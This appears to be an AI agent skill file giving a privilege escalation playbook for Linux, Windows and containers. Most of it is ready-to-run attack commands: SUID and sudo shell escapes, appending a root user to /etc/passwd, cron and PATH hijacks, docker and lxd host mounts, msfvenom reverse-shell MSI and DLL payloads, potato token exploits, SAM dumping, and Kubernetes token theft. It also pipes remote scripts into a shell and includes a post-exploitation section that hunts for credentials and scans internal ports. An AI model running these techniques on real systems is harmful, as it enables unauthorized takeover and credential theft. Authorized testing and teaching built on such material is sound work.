---
name: privilege-escalation
description: Linux and Windows privilege escalation techniques covering SUID, sudo, services, credentials, and container escape
---

# Privilege Escalation

After gaining initial access, the goal is to elevate privileges to root/SYSTEM. Enumerate thoroughly before attempting any exploit — most PE is logic abuse, not CVE exploitation.

## Immediate Triage (Run First)

    id && whoami && hostname && uname -a
    cat /etc/os-release
    ip a; netstat -tulpn 2>/dev/null || ss -tulpn
    cat /etc/passwd | grep -v nologin | grep -v false
    sudo -l

Automated enumeration — run both, compare results:

    curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh | tee /tmp/linpeas.txt
    wget https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh -O /tmp/lse.sh && bash /tmp/lse.sh -l 2

---

## Linux Privilege Escalation

### SUID / SGID Binaries

    find / -perm -4000 -type f 2>/dev/null
    find / -perm -2000 -type f 2>/dev/null

Cross-reference every result with GTFOBins: https://gtfobins.github.io/
Common abusable SUIDs: `bash`, `find`, `vim`, `python`, `perl`, `php`, `nmap`, `awk`, `cp`, `mv`

    # nmap (old versions with interactive mode)
    nmap --interactive
    nmap> !sh

    # find with SUID
    find / -name . -exec /bin/sh -p \; -quit

    # Python with SUID
    python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

### Sudo Misconfigurations

    sudo -l

Key patterns:
- `NOPASSWD: ALL` → `sudo su` or `sudo bash`
- `NOPASSWD: /usr/bin/vim` → `sudo vim -c ':!/bin/bash'`
- `NOPASSWD: /usr/bin/find` → `sudo find / -exec /bin/bash \;`
- `NOPASSWD: /usr/bin/python*` → `sudo python3 -c 'import pty;pty.spawn("/bin/bash")'`
- `env_keep+=LD_PRELOAD` → write shared lib that calls setuid(0)+setgid(0)+system("/bin/bash")
- `(root) NOPASSWD: /path/to/script.sh` → if writable → overwrite with shell

### Cron Jobs and Scheduled Tasks

    crontab -l
    cat /etc/crontab
    ls -la /etc/cron.*
    find / -name "*.sh" -writable 2>/dev/null

Targets:
- Writable script called by root cron
- PATH hijack: cron uses relative path, write your own binary earlier in PATH
- Wildcard injection: `tar -czf /backup/* ` → create `--checkpoint=1 --checkpoint-action=exec=sh privesc.sh`

### Writable Files in Critical Paths

    # /etc/passwd writable (add root user)
    openssl passwd -1 -salt salt pw123
    echo 'r00t:$1$salt$hashhere:0:0:root:/root:/bin/bash' >> /etc/passwd

    # /etc/shadow writable — replace root hash
    # /etc/sudoers writable — add user ALL=(ALL) NOPASSWD:ALL

### Linux Capabilities

    getcap -r / 2>/dev/null

Abusable capabilities:
- `cap_setuid+ep` on python/perl/ruby → `setuid(0)` then `os.system("/bin/bash")`
- `cap_net_raw+ep` on ping/tcpdump → packet sniffing
- `cap_dac_read_search+ep` on tar → read any file

    # python3 with cap_setuid
    python3 -c "import os; os.setuid(0); os.system('/bin/bash')"

### PATH Hijacking

    echo $PATH
    find / -writable -type d 2>/dev/null | grep -E "^/(usr/local|home|tmp|opt)"

If root script calls `service`, `cat`, `ps`, etc without full path:

    export PATH=/tmp:$PATH
    echo '#!/bin/bash\n/bin/bash' > /tmp/service
    chmod +x /tmp/service

### NFS No_root_squash

    cat /etc/exports
    showmount -e <target>

If no_root_squash is set: mount from attacker, create SUID binary as root, execute on target.

    # On attacker (as root):
    mount -t nfs <target>:/shared /mnt/nfs
    cp /bin/bash /mnt/nfs/rootbash
    chmod +s /mnt/nfs/rootbash
    # On target:
    /shared/rootbash -p

### Docker Group

    id | grep docker

If user is in docker group:

    docker run -it --rm -v /:/mnt alpine chroot /mnt sh
    # Or: docker run -v /:/host --rm -it alpine chroot /host sh

### LXD/LXC Group

    id | grep lxd

    lxc image import alpine.tar.gz --alias myimage
    lxc init myimage mycontainer -c security.privileged=true
    lxc config device add mycontainer host-root disk source=/ path=/mnt/root recursive=true
    lxc start mycontainer
    lxc exec mycontainer /bin/sh
    # Inside: chroot /mnt/root bash

### Kernel Exploits (Last Resort)

    uname -r
    searchsploit linux kernel $(uname -r | cut -d- -f1)

Common: Dirty COW (CVE-2016-5195), Dirty Pipe (CVE-2022-0847), OverlayFS (CVE-2023-0386)

    # Check dirty pipe (kernel 5.8-5.16)
    ls -la /proc/self/fd

---

## Windows Privilege Escalation

### Automated Enumeration

    # PowerShell
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks

    # WinPEAS
    .\winpeas.exe > C:\Temp\winpeas_out.txt

### AlwaysInstallElevated

    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

Both = 1 → generate malicious MSI:

    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=443 -f msi -o evil.msi
    msiexec /quiet /qn /i evil.msi

### Unquoted Service Paths

    wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v '\"'

If path: `C:\Program Files\Vulnerable App\service.exe`
Create: `C:\Program.exe` or `C:\Program Files\Vulnerable.exe`

    sc start VulnerableService

### Weak Service ACLs

    .\accesschk.exe /accepteula -uwcqv "Authenticated Users" *
    sc config VulnSvc binpath= "C:\Temp\shell.exe"
    sc start VulnSvc

### SeImpersonatePrivilege / Potato Attacks

    whoami /priv | findstr /i impersonate

If SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege:

    # JuicyPotatoNG
    .\JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami > C:\Temp\out.txt"

    # PrintSpoofer (Server 2016/2019, Win10)
    .\PrintSpoofer.exe -i -c cmd

    # GodPotato (most Windows versions)
    .\GodPotato.exe -cmd "cmd /c whoami"

### DLL Hijacking

    # Find missing DLLs in Procmon or via:
    .\Procmon.exe /Quiet /Minimized /BackingFile C:\Temp\log.pml

Look for `NAME NOT FOUND` on DLL load from writable directory.

    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=443 -f dll -o missing.dll

### Stored Credentials

    cmdkey /list
    runas /savecred /user:admin cmd.exe

    # Registry credentials
    reg query HKLM /f password /t REG_SZ /s
    reg query HKCU /f password /t REG_SZ /s

    # Unattend files
    dir /s *unattend* *sysprep* 2>nul

    # SAM/SYSTEM (if accessible)
    reg save HKLM\SAM C:\Temp\sam.hive
    reg save HKLM\SYSTEM C:\Temp\system.hive
    # Transfer and crack: impacket-secretsdump LOCAL -sam sam.hive -system system.hive

### LAPS Bypass

    # Check if LAPS is installed
    Get-Command Get-AdmPwdPassword -ErrorAction SilentlyContinue

    # Read password if you have ReadProperty rights
    Get-AdmPwdPassword -ComputerName <hostname> | Select-Object -ExpandProperty Password

---

## Container Escape

### Check if You're in a Container

    cat /proc/1/cgroup | grep -i docker
    ls /.dockerenv 2>/dev/null
    cat /proc/self/status | grep CapEff

### Privileged Container

    # If CapEff includes CAP_SYS_ADMIN:
    capsh --decode=$(cat /proc/self/status | grep CapEff | awk '{print $2}') | grep sys_admin

    # Mount host filesystem
    mkdir /tmp/hostfs
    mount /dev/sda1 /tmp/hostfs
    chroot /tmp/hostfs /bin/bash

### Docker Socket Exposed

    ls -la /var/run/docker.sock

    docker -H unix:///var/run/docker.sock run -it --rm -v /:/mnt alpine chroot /mnt sh

### CVE-2019-5736 (runc Overwrite)

Affects Docker < 18.09.2 — overwrite runc binary via /proc/self/exe on container exec.

### Kubernetes Service Account Token

    cat /var/run/secrets/kubernetes.io/serviceaccount/token
    APISERVER=https://kubernetes.default.svc
    curl -s $APISERVER/api/v1/namespaces --header "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" --insecure

---

## Post-Exploitation Checklist

Once root/SYSTEM:

    # Linux
    cat /etc/shadow
    cat ~/.bash_history
    find / -name "*.key" -o -name "id_rsa" -o -name "*.pem" 2>/dev/null
    find / -name ".env" 2>/dev/null
    cat /root/.ssh/authorized_keys

    # Credential files
    find / -name "wp-config.php" -o -name "database.yml" -o -name "settings.py" 2>/dev/null

    # Pivot: internal network
    arp -a
    cat /etc/hosts
    for port in 22 80 443 3306 5432 6379 27017; do nc -zv <internal_ip> $port 2>&1 | grep open; done

---

## Key Tools

    LinPEAS:         curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
    WinPEAS:         .\winpeas.exe
    PowerUp:         IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
    GTFOBins:        web_search "gtfobins <binary_name>"
    LOLBAS:          web_search "lolbas <binary_name>"
    Impacket:        impacket-secretsdump, impacket-psexec, impacket-wmiexec
    Responder:       responder -I eth0 -wv
    CrackMapExec:    cme smb <target> -u user -p pass --shares
    Chisel:          chisel server/client for tunneling
    Ligolo-ng:       more stable pivot/tunnel tool

---

## Pro Tips

1. Run LinPEAS first, pipe to tee — read while it scans
2. SUID/capabilities + GTFOBins is fastest path; check before anything else
3. Cron PATH hijack is often overlooked — trace what root's crontab calls without full path
4. On Windows, check token privileges first — SeImpersonate is almost always instant SYSTEM
5. Environment variables leak creds constantly — `env | grep -iE "pass|key|secret|token"`
6. Always check `/opt/`, `/srv/`, `/var/backups/`, `/home/*/.ssh/` for forgotten configs
7. If in Docker: check cap_sys_admin, socket, and /proc/sched_debug for host info leaks
8. Document EVERY privilege gained — screenshot id/whoami output as evidence

## Summary

Most PE chains are: enumerate blindly → find misconfiguration → abuse it. CVE exploitation is last resort. Start with sudo -l, SUID, cron, and stored creds before reaching for kernel exploits.
